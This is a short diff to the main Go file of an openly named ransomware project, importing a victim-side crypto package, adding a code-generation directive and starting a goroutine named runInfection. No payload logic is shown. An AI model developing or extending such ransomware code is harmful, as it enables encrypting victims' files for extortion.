@@ -4,6 +4,8 @@ package main
 
 import "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 
+//go:generate go run generate/cryptoservice_buffer.go
+
 func main() {
     done := make(chan struct{})
     go runInfection(done)
